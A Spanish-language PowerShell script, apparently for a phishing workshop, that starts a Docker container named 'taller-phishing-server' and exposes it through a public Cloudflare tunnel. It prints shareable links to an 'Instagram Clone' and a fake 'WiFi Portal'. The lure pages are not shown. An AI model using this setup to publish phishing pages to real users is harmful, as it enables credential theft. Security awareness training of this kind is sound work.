# Script para crear un túnel público con Cloudflared
# Uso: .\iniciar_tunel_publico.ps1

Write-Host ""
Write-Host "=============================================" -ForegroundColor Cyan
Write-Host "  INICIANDO TUNEL PUBLICO CON CLOUDFLARED" -ForegroundColor Cyan
Write-Host "=============================================" -ForegroundColor Cyan
Write-Host ""

# Buscar cloudflared
$cloudflaredPath = Get-ChildItem "$env:LOCALAPPDATA\Microsoft\WinGet\Packages" -Recurse -Filter "cloudflared.exe" -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName

if (-not $cloudflaredPath) {
    Write-Host "[X] Cloudflared no encontrado" -ForegroundColor Red
    Write-Host "    Instalando Cloudflared..." -ForegroundColor Yellow
    winget install --id Cloudflare.cloudflared -e --silent
    Write-Host "    [OK] Instalado. Por favor ejecuta este script nuevamente." -ForegroundColor Green
    exit
}

Write-Host "[OK] Cloudflared encontrado: $cloudflaredPath" -ForegroundColor Green
Write-Host ""

# Verificar si el contenedor está corriendo
$container = docker ps --filter "name=taller-phishing-server" --format "{{.Names}}"

if (-not $container) {
    Write-Host "[!] Iniciando servidor Docker..." -ForegroundColor Yellow
    docker run -d --rm -p 5000:5000 --name taller-phishing-server taller-phishing | Out-Null
    Start-Sleep -Seconds 3
    Write-Host "[OK] Servidor iniciado" -ForegroundColor Green
    Write-Host ""
}

Write-Host "[*] Creando tunel publico (esto puede tardar unos segundos)..." -ForegroundColor Yellow
Write-Host ""

# Crear túnel en segundo plano y capturar la URL (Con reintentos)
$maxRetries = 5
$retryCount = 0
$url = $null

do {
    $retryCount++
    if ($retryCount -gt 1) {
        Write-Host "    [!] Intento $retryCount de $maxRetries..." -ForegroundColor Yellow
        # Limpiar jobs anteriores
        Get-Job | Remove-Job -Force
    }

    $job = Start-Job -ScriptBlock {
        param($cloudflaredPath)
        & $cloudflaredPath tunnel --protocol http2 --no-autoupdate --url http://localhost:5000 2>&1
    } -ArgumentList $cloudflaredPath

    # Esperar a que se genere la URL
    $timeout = 0
    do {
        Start-Sleep -Seconds 2
        $timeout += 2
        $output = Receive-Job $job -Keep
        $urlMatch = $output | Select-String -Pattern "https://[a-z0-9-]+\.trycloudflare\.com"
        if ($urlMatch) {
            # Filtrar URLs de error de API
            $candidateUrl = $urlMatch.Matches.Value
            if ($candidateUrl -notlike "*api.trycloudflare.com*") {
                $url = $candidateUrl
            }
        }
    } while (-not $url -and $timeout -lt 15)

} until ($url -or $retryCount -ge $maxRetries)

if ($url) {
    Write-Host "=============================================" -ForegroundColor Green
    Write-Host "  [OK] TUNEL PUBLICO ACTIVADO" -ForegroundColor Green
    Write-Host "=============================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "Comparte estas URLs (verificadas):" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "   Instagram Clone:" -ForegroundColor White
    Write-Host "   $url" -ForegroundColor Green
    Write-Host ""
    Write-Host "   WiFi Portal:" -ForegroundColor White
    Write-Host "   $url/wifi" -ForegroundColor Green
    Write-Host ""
    Write-Host "=============================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "IMPORTANTE: El tunel esta activo." -ForegroundColor Yellow
    Write-Host "Para detenerlo, cierra esta ventana o presiona CTRL+C (y luego deten el trabajo)." -ForegroundColor Gray
    Write-Host ""
    
    Write-Host "Presiona Enter para cerrar el tunel y salir..." -ForegroundColor Yellow
    Read-Host
    
    Stop-Job $job
    Remove-Job $job
    Write-Host "Tunel cerrado." -ForegroundColor Cyan
} else {
    Write-Host "[X] No se pudo crear el tunel. Posible error de conexion." -ForegroundColor Red
    Write-Host "    Salida del comando:" -ForegroundColor Yellow
    $output | ForEach-Object { Write-Host "    $_" -ForegroundColor Gray }
    Stop-Job $job
    Remove-Job $job
}
